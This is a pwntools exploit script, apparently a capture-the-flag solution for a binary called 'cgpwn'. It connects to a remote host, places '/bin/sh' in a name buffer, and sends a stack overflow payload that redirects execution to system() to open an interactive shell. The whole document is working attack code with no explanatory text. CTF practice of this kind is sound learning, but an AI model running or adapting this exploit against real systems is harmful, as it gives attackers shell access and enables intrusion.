```
from pwn import *
context.log_level='debug'
sh=remote('61.147.171.105',55346)
elf=ELF('./cgpwn')
system_addr=elf.symbols['system']
name_addr=0x0804A080
sh.sendlineafter('name','/bin/sh')
payload=b'a'*(0x26+0x4)+p32(system_addr)+p32(0)+p32(name_addr)
sh.sendlineafter('here:',payload)
sh.interactive()
```